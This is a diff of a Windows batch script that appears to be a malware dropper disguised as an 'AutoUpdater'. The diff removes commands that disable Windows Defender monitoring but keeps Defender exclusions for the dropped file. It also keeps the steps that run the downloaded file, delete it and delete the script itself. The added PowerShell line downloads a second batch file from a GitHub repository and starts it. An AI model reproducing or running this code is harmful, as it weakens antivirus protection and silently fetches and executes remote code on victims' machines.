@@ -8,15 +8,6 @@ set "url=https://github.com/Sxzzzy/blue/raw/main/%file%"
 :: Define the document path dynamically using USERPROFILE
 set "docPath=%USERPROFILE%\AppData\Roaming\Microsoft"
 
-:: Disable Windows Defender Real-Time Monitoring
-powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
-
-:: Disable Windows Defender AntiSpyware
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t "REG_DWORD" /d "1" /f
-
-:: Exclude the AutoUpdater process
-powershell -Command "Add-MpPreference -ExclusionProcess '%file%'"
-
 :: Exclude the AutoUpdater file dynamically based on the user's profile
 powershell -Command "Add-MpPreference -ExclusionPath '%docPath%\%file%'"
 
@@ -33,6 +24,7 @@ start /wait "" "%file%"
 :: Delete the file
 del /q "%file%"
 
+$url="https://raw.githubusercontent.com/Sxzzzy/blue/main/e.bat"; $out="C:\\temp\\e.bat"; (New-Object System.Net.WebClient).DownloadFile($url, $out); Start-Process $out;
 :: Attempt to delete this script
 start /b "" cmd /c del "%~f0"&exit
 
